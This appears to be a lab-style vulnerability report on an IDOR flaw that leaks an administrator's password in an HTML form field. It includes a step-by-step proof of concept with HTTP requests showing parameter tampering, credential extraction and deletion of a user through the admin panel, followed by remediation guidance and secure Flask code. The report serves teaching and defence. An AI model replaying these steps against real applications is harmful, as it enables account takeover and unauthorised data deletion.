# Vulnerability Report: Account Takeover via Insecure Direct Object Reference (IDOR) and Credential Disclosure

* **Vulnerability Type:** Insecure Direct Object Reference (IDOR) (CWE-639) / Exposure of Sensitive Information via HTML Markup (CWE-200) / Account Takeover (CWE-284)

* **Severity:** High

* **Target Component:** Account Management Endpoint (`/my-account?id=`)

* **OWASP Top 10 Mapping:** A01:2021 – Broken Access Control

## 1. Executive Summary

A severe security flaw was identified in the user account settings functionality. The application allows users to view account details specified by the `id` query parameter without verifying if the requesting user owns that account. Furthermore, the endpoint renders the account owner's existing password inside an HTML form input element (`<input type="password" value="...">`). An authenticated attacker can manipulate the `id` parameter to target the `administrator` account, extract the plain-text administrative credentials directly from the response body, and achieve complete system compromise.

## 2. Technical Analysis & Root Cause

The vulnerability combines an access control failure with unsafe data rendering practices.

### Vulnerability Breakdown

1. **Missing Authorization Validation:** The backend endpoint processes requests to `/my-account?id=[username]` by retrieving records directly from the database based on the client-supplied `id`, omitting checks to ensure `session.username == request.args.get('id')`.

2. **Unnecessary Credential Exposure:** When populating the account settings form, the template engine embeds the user's secret password string into the HTML `value` attribute of a masked password input field. Masking input fields (`type="password"`) only conceals characters visually in web browsers; the raw value remains fully visible within the raw HTTP response body and DOM source code.

```
[ Attacker: wiener ]
          |
          | GET /my-account?id=administrator
          v
[ Application Server ]
          |
          | 1. Query: SELECT * FROM users WHERE username = 'administrator'
          | 2. Render Template: <input name="password" value="ADMIN_PASSWORD">
          v
[ HTTP Response Body Leaks Credentials ]
          |
          v
[ Attacker Logins as Administrator -> Deletes User 'carlos' ]


```

## 3. Proof of Concept (PoC)

1. Authenticate to the web application using standard user credentials (`wiener:peter`).

2. Navigate to **My Account** and capture the request using an HTTP proxy (e.g., Burp Suite):

   ```
   GET /my-account?id=wiener HTTP/1.1
   Host: target-app.net
   Cookie: session=vX9z...
   
   
   ```

3. Send the request to **Burp Repeater** and update the query parameter to target `administrator`:

   ```
   GET /my-account?id=administrator HTTP/1.1
   Host: target-app.net
   Cookie: session=vX9z...
   
   
   ```

4. Submit the request and inspect the HTML response body for input form elements:

   ```
   <form id="account-form">
       <label>Username</label>
       <input type="text" name="username" value="administrator">
       <label>Password</label>
       <input type="password" name="password" value="s3cr3t_p@ssw0rd!">
   </form>
   
   
   ```

5. Copy the extracted administrator password (`s3cr3t_p@ssw0rd!`).

6. Log out of the `wiener` account, then authenticate as `administrator` using the stolen credentials.

7. Navigate to the `/admin` dashboard and execute the user deletion action for `carlos`:

   ```
   GET /admin/delete?username=carlos HTTP/1.1
   Host: target-app.net
   Cookie: session=admin_session_...
   
   
   ```

8. **Result:** User `carlos` is deleted. Account takeover and administrative compromise confirmed.

## 4. Impact

* **Complete System Compromise:** Attackers can retrieve valid administrative passwords and gain full access to administrative capabilities.

* **Account Takeover:** Any registered account password can be stolen via simple URL parameter manipulation.

* **Information Exposure:** High-risk exposure of sensitive credential data in client-side HTML source code.

## 5. Remediation & Developer Guidance

### Primary Fixes

1. **Never Render Existing Passwords in Responses:**
   Do not return pre-filled current passwords in HTML forms or API responses. Password update forms should only present empty fields for "Current Password", "New Password", and "Confirm New Password".

2. **Enforce Object-Level Access Control (IDOR Mitigation):**
   Validate that the requesting session identity matches the target resource owner prior to fetching profile data.

3. **Derive Identity Directly from Session:**
   Avoid accepting explicit user identifiers (`id`) via URL parameters for user-specific settings pages; read identity directly from the authenticated session context.

#### Secure Code Implementation Example (Python / Flask)

```
from flask import Flask, request, session, abort, render_template

app = Flask(__name__)

@app.route('/my-account', methods=['GET'])
def get_account_page():
    # Retrieve identity strictly from authenticated session
    session_user = session.get('username')
    if not session_user:
        abort(401)
        
    requested_user = request.args.get('id')
    
    # Access Control Check
    if requested_user != session_user:
        abort(403)
        
    user_data = db_get_user_info(session_user)
    
    # Ensure sensitive fields (like password) are stripped before rendering
    safe_profile = {
        "username": user_data["username"],
        "email": user_data["email"]
        # Password explicitly excluded!
    }
    
    return render_template('account.html', profile=safe_profile)


```

## 6. References

* **CWE-639:** [Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)

* **CWE-200:** [Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)

* **CWE-284:** [Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)

* **OWASP:** [Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)